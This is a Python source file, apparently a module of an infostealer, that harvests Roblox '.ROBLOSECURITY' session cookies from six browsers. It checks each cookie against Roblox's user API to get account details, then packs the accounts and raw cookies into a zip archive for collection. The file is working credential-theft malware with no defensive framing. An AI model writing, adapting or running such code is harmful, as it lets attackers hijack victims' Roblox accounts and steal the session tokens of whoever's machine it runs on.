import requests, browser_cookie3

def RobloxAccount(zip_file):
    file_roblox_account = ""
    number_roblox_account = 0
    cookie_list = []

    def GetCookie(cookies):
        try:
            cookie_str = str(cookies)
            if ".ROBLOSECURITY=" in cookie_str:
                cookie = cookie_str.split(".ROBLOSECURITY=")[1].split(" for .roblox.com/>")[0].strip()
                return cookie
            return None
        except:
            return None

    browsers = [
        browser_cookie3.edge,
        browser_cookie3.chrome,
        browser_cookie3.opera,
        browser_cookie3.firefox,
        browser_cookie3.opera_gx,
        browser_cookie3.brave
    ]

    for browser_func in browsers:
        try:
            cookies = browser_func(domain_name=".roblox.com")
            cookie = GetCookie(cookies)
            if cookie and cookie not in cookie_list:
                cookie_list.append(cookie)
                number_roblox_account += 1

                try:
                    info = requests.get(
                        "https://users.roblox.com/v1/users/authenticated",
                        cookies={".ROBLOSECURITY": cookie},
                        timeout=10
                    )
                    api = info.json() if info.status_code == 200 else {}
                except:
                    api = {}

                user_id = api.get('id', "None")
                username = api.get('name', "None")
                display_name = api.get('displayName', "None")

                file_roblox_account += f"""
Roblox Account n°{number_roblox_account}:
 - Navigator     : {browser_func.__name__}
    - Id            : {user_id}
    - Username      : {username}
    - DisplayName   : {display_name}
    - Cookie        : {cookie}
"""
        except Exception:
            continue

    if not cookie_list:
        file_roblox_account = "No roblox cookie found."

    zip_file.writestr(f"Roblox Accounts ({number_roblox_account}).txt", file_roblox_account)
    return number_roblox_account